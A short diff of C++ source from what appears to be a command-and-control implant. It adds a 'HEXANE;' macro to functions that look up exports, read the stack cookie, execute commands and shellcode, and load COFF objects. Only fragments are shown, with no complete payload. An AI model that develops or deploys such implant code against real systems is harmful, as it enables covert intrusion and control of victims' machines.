@@ -10,8 +10,10 @@ namespace Memory {
     namespace Methods {
 
         UINT_PTR GetStackCookie() {
+            HEXANE;
 
             uintptr_t cookie = 0;
+
             if (!NT_SUCCESS(ntstatus = Ctx->nt.NtQueryInformationProcess(NtCurrentProcess(), (PROCESSINFOCLASS) 0x24, &cookie, 0x4, nullptr))) {
                 return 0;
             }
@@ -20,6 +22,7 @@ namespace Memory {
         }
 
         _resource* GetIntResource(HMODULE base, const int rsrc_id) {
+            HEXANE;
 
             HRSRC rsrc_info      = { };
             _resource *object   = (_resource*) Malloc(sizeof(_resource));
@@ -34,6 +37,7 @@ namespace Memory {
         }
 
         _executable* CreateImageData(uint8_t *data) {
+            HEXANE;
 
             _executable *image = (_executable*) Malloc(sizeof(_executable));
 
@@ -83,6 +87,7 @@ namespace Memory {
         }
 
         VOID ContextDestroy() {
+            HEXANE;
             // TODO: ContextDestroy needs expanded to destroy all strings (http/smb context + anything else)
 
             auto free = Ctx->nt.RtlFreeHeap;
@@ -145,6 +150,7 @@ namespace Memory {
         }
 
         UINT_PTR LoadExport(const char *module_name, const char *export_name) {
+            HEXANE;
 
             uintptr_t symbol    = 0;
             bool reload         = false;
@@ -173,6 +179,7 @@ namespace Memory {
     namespace Execute {
 
         BOOL ExecuteCommand(_parser parser) {
+            HEXANE;
 
             uintptr_t pointer = 0;
 
@@ -193,6 +200,7 @@ namespace Memory {
         }
 
         BOOL ExecuteShellcode(_parser parser) {
+            HEXANE;
 
             void* base      = nullptr;
             void(*exec)()   = nullptr;
@@ -228,6 +236,7 @@ namespace Memory {
         }
 
         VOID LoadObject(_parser parser) {
+            HEXANE;
 
             _coff_params* coff  = (_coff_params*) Malloc(sizeof(_coff_params));
             _coff_params* saved = nullptr;
